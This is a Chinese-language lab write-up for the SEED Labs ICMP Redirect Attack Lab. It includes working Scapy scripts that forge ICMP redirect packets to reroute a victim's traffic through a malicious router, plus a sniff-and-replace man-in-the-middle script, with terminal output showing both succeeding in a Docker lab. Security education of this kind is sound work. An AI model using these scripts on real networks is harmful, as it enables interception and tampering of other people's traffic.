---
layout:     post
title:      "ICMP Redirect Attack"
date:       2022-10-02 00:00:00 +0800
categories: 实验
tags:       seedlab icmp
summary:    "本文为 SEED Labs 2.0 - ICMP Redirect Attack Lab 的实验记录，介绍了如何利用 ICMP 重定向攻击实现中间人攻击 (MITM)。"
series:     SEEDLabs
series_index: 8
mathjax:    true
---

本文为 [SEED Labs 2.0 - ICMP Redirect Attack Lab](https://seedsecuritylabs.org/Labs_20.04/Networking/ICMP_Redirect/) 的实验记录。

## 实验原理

ICMP 重定向是路由器向 IP 数据包发送者发送的错误消息。 当路由器认为数据包被错误地路由时，使用重定向，并且它想通知发送者它应该为随后发送到同一目的地的数据包使用不同的路由器。攻击者可以使用 ICMP 重定向来更改受害者的路由。
本实验的目的是对受害者发起 ICMP 重定向攻击，这样当受害者向 192.168.60.5 发送数据包时，它将使用恶意路由器容器（10.9.0.111）作为其路由器。由于恶意路由器被攻击者控制，攻击者可以截取数据包，进行修改，然后将修改后的数据包发送出去。这是中间人 (MITM) 攻击的一种形式。本实验涵盖以下主题：

- IP 和 ICMP 协议
- ICMP 重定向攻击
- 路由

## Task 1: Launching ICMP Redirect Attack

![ICMP Redirect Attack 拓扑](/assets/post/images/icmp1.svg)

启动 docker：

```shell
dcbuild
dcup
```

首先修改 shell 以便查看：

```shell
# export PS1="\w victim-10.9.0.5$ "
```

```shell
# export PS1="\w attacker-10.9.0.105$ "
```

```shell
# export PS1="\w host-192.168.60.5$ "
```

```shell
# export PS1="\w malicious-router-10.9.0.111$ "
```

首先在 victim 上查看到 `192.168.60.5` 的路由：

```shell
victim-10.9.0.5$ mtr -n 192.168.60.5
```

![Launching ICMP Redirect Attack 正常路由](/assets/post/images/icmp2.webp)

这里的路由是正常的。

然后保持其 ping `192.168.60.5：`

```shell
victim-10.9.0.5$ ping 192.168.60.5 &
```

编写 `icmp.py`：

```python
#!/usr/bin/python3

from scapy.all import *

ip = IP(src = '10.9.0.11', dst = '10.9.0.5')
icmp = ICMP(type=5, code=1)
icmp.gw = '10.9.0.111'

# The enclosed IP packet should be the one that
# triggers the redirect message.
ip2 = IP(src = '10.9.0.5', dst = '192.168.60.5')
send(ip/icmp/ip2/ICMP());
```

在 attacker 上运行：

```shell
attacker-10.9.0.105$ icmp.py
.
Sent 1 packets.
```

此时 victim 的路由改变：

```shell
victim-10.9.0.5$ mtr -n 192.168.60.5
```

![Launching ICMP Redirect Attack 路由改变](/assets/post/images/icmp3.webp)

> Question 1: Can you use ICMP redirect attacks to redirect to a remote machine? Namely, the IP address assigned to icmp.gw is a computer not on the local LAN. Please show your experiment result, and explain your observation.

修改程序：

```python
#!/usr/bin/python3

from scapy.all import *

ip = IP(src = '10.9.0.11', dst = '10.9.0.5')
icmp = ICMP(type=5, code=1)
icmp.gw = '192.168.60.6'

# The enclosed IP packet should be the one that
# triggers the redirect message.
ip2 = IP(src = '10.9.0.5', dst = '192.168.60.5')
send(ip/icmp/ip2/ICMP());
```

然后保持victim ping `192.168.60.5`：

```shell
victim-10.9.0.5$ ping 192.168.60.5 &
```

清空 cache：

```shell
victim-10.9.0.5$ ip route flush cache
```

在 attacker 上运行：

```shell
attacker-10.9.0.105$ icmp.py
.
Sent 1 packets.
```

此时查看 victim 的路由：

```shell
victim-10.9.0.5$ mtr -n 192.168.60.5
```

![Launching ICMP Redirect Attack 路由未改变](/assets/post/images/icmp4.webp)

可以看出，此时没有变化。

> Question 2: Can you use ICMP redirect attacks to redirect to a non-existing machine on the same network? Namely, the IP address assigned to icmp.gw is a local computer that is either offline or non-existing. Please show your experiment result, and explain your observation.

修改程序：

```python
#!/usr/bin/python3

from scapy.all import *

ip = IP(src = '10.9.0.11', dst = '10.9.0.5')
icmp = ICMP(type=5, code=1)
icmp.gw = '10.9.0.99'

# The enclosed IP packet should be the one that
# triggers the redirect message.
ip2 = IP(src = '10.9.0.5', dst = '192.168.60.5')
send(ip/icmp/ip2/ICMP());
```

然后保持 victim ping `192.168.60.5`：

```shell
victim-10.9.0.5$ ping 192.168.60.5 &
```

清空 cache：

```shell
victim-10.9.0.5$ ip route flush cache
```

在 attacker 上运行：

```shell
attacker-10.9.0.105$ icmp.py
.
Sent 1 packets.
```

此时查看 victim 的路由：

```shell
victim-10.9.0.5$ mtr -n 192.168.60.5
```

![Launching ICMP Redirect Attack 路由未改变](/assets/post/images/icmp5.webp)

可以看出，此时没有变化。：

> Question 3: If you look at the docker-compose.yml file, you will find the following entries for the malicious router container. What are the purposes of these entries? Please change their value to 1, and launch the attack again. Please describe and explain your observation.

修改 dockerfile：

```dockerfile
- net.ipv4.conf.all.send_redirects=1
- net.ipv4.conf.default.send_redirects=1
- net.ipv4.conf.eth0.send_redirects=1
```

编写 `icmp.py：`

```python
#!/usr/bin/python3

from scapy.all import *

ip = IP(src = '10.9.0.11', dst = '10.9.0.5')
icmp = ICMP(type=5, code=1)
icmp.gw = '10.9.0.111'

# The enclosed IP packet should be the one that
# triggers the redirect message.
ip2 = IP(src = '10.9.0.5', dst = '192.168.60.5')
send(ip/icmp/ip2/ICMP());
```

在 attacker 上运行：

```shell
attacker-10.9.0.105$ icmp.py
.
Sent 1 packets.
```

此时查看 victim 的路由：

```shell
victim-10.9.0.5$ mtr -n 192.168.60.5
```

![Launching ICMP Redirect Attack 路由改变失败](/assets/post/images/icmp6.webp)

可以看到，也失败了。

## Task 2: Launching the MITM Attack

先把所有东西改回原样。

关闭转发：

```dockerfile
- net.ipv4.ip_forward=0
```

保持 victim ping `192.168.60.5：`

```shell
victim-10.9.0.5$ ping 192.168.60.5 &
```

编写 `icmp.py：`

```python
#!/usr/bin/python3

from scapy.all import *

ip = IP(src = '10.9.0.11', dst = '10.9.0.5')
icmp = ICMP(type=5, code=1)
icmp.gw = '10.9.0.111'

# The enclosed IP packet should be the one that
# triggers the redirect message.
ip2 = IP(src = '10.9.0.5', dst = '192.168.60.5')
send(ip/icmp/ip2/ICMP());
```

在 attacker 上运行：

```shell
attacker-10.9.0.105$ icmp.py
.
Sent 1 packets.
```

编写 `mitm.py`：

```python
#!/usr/bin/env python3
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

def spoof_pkt(pkt):
   newpkt = IP(bytes(pkt[IP]))
   del(newpkt.chksum)
   del(newpkt[TCP].payload)
   del(newpkt[TCP].chksum)

   if pkt[TCP].payload:
       data = pkt[TCP].payload.load
       print("*** %s, length: %d" % (data, len(data)))

       # Replace a pattern
       newdata = data.replace(b'Chenyang', b'AAAAAAAA')

       send(newpkt/newdata)
   else: 
       send(newpkt)

f = 'tcp and ether src 02:42:0a:09:00:05' 
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

在 malicious-server 上运行：

```shell
malicious-router-10.9.0.111$ mitm.py
LAUNCHING MITM ATTACK.........
```

在 host 上启动 nc：

```shell
host-192.168.60.5$ nc -lp 9090
```

在 victim 上连接并发送内容：

```shell
victim-10.9.0.5$ nc 192.168.60.5 9090
aaaa
Chenyang
```

host 接收到：

```shell
host-192.168.60.5$ nc -lp 9090
aaaa
AAAAAAAA
```

malicious-server 显示：

```shell
malicious-router-10.9.0.111$ mitm.py
LAUNCHING MITM ATTACK.........
.
Sent 1 packets.
.
Sent 1 packets.
*** b'aaaa\n', length: 5
.
Sent 1 packets.
*** b'Chenyang\n', length: 9
.
Sent 1 packets.
```

可以看到，攻击成功。

> Question 4: In your MITM program, you only need to capture the traffics in one direction. Please indicate which direction, and explain why.

只需要过滤出 victim 到 host 的报文即可，因为需要修改的报文就在这个方向上。

> Question 5: In the MITM program, when you capture the nc traffics from A (10.9.0.5), you can use A’s IP address or MAC address in the filter. One of the choices is not good and is going to create issues, even though both choices may work. Please try both, and use your experiment results to show which choice is the correct one, and please explain your conclusion.

修改 `mitm.py`：

```python
#!/usr/bin/env python3
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

def spoof_pkt(pkt):
   newpkt = IP(bytes(pkt[IP]))
   del(newpkt.chksum)
   del(newpkt[TCP].payload)
   del(newpkt[TCP].chksum)

   if pkt[TCP].payload:
       data = pkt[TCP].payload.load
       print("*** %s, length: %d" % (data, len(data)))

       # Replace a pattern
       newdata = data.replace(b'Chenyang', b'AAAAAAAA')

       send(newpkt/newdata)
   else: 
       send(newpkt)

f = 'tcp and src host 10.9.0.5' 
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

在 malicious-server 上运行：

```shell
malicious-router-10.9.0.111$ mitm.py
LAUNCHING MITM ATTACK.........
```

在 host 上启动 nc：

```shell
host-192.168.60.5$ nc -lp 9090
```

在 victim 上连接并发送内容：

```shell
victim-10.9.0.5$ nc 192.168.60.5 9090
aaaa
Chenyang
```

host 接收到：

```shell
host-192.168.60.5$ nc -lp 9090
aaaa
AAAAAAAA
```

malicious-server 显示：

```shell
malicious-router-10.9.0.111$ mitm.py
LAUNCHING MITM ATTACK.........
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
*** b'AAAAAAAA\n', length: 9
.
Sent 1 packets.
*** b'aaaa\n', length: 5
```

可以看到，攻击成功。但是 malicious-server 却在疯狂地发送报文。这是因为它捕获到了自己发送的报文，发送完又捕获到了，陷入了死循环。

## 实验总结

本实验较为简单。
